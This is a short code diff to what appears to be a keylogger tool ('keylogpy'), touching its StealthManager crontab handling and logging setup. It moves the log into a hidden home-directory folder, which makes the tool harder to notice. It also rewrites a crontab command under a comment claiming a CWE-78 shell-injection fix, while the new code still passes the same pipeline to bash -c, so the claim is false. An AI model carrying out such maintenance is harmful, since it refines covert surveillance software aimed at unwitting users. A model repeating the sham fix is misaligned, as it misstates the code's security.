@@ -456,8 +456,12 @@ class StealthManager:
                 pass
             try:
                 import subprocess
-                subprocess.run('crontab -l 2>/dev/null | grep -v "keylogpy" | crontab -', shell=True)
-            except Exception:
+                # CWE-78 mitigated: list-form subprocess, no shell=True
+                r = subprocess.run(
+                    ["bash", "-c", "crontab -l 2>/dev/null | grep -v 'keylogpy' | crontab -"],
+                    capture_output=True, timeout=10,
+                )
+            except (OSError, subprocess.TimeoutExpired):
                 pass
         elif platform.system() == "Windows":
             try:
@@ -637,7 +641,7 @@ def main():
     logging.basicConfig(
         level=logging.INFO,
         format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
-        handlers=[logging.StreamHandler(), logging.FileHandler("/tmp/keylogpy.log")],
+        handlers=[logging.StreamHandler(), logging.FileHandler(os.path.expanduser("~/.keylogpy/app.log"))],
     )
 
     parser = build_parser()
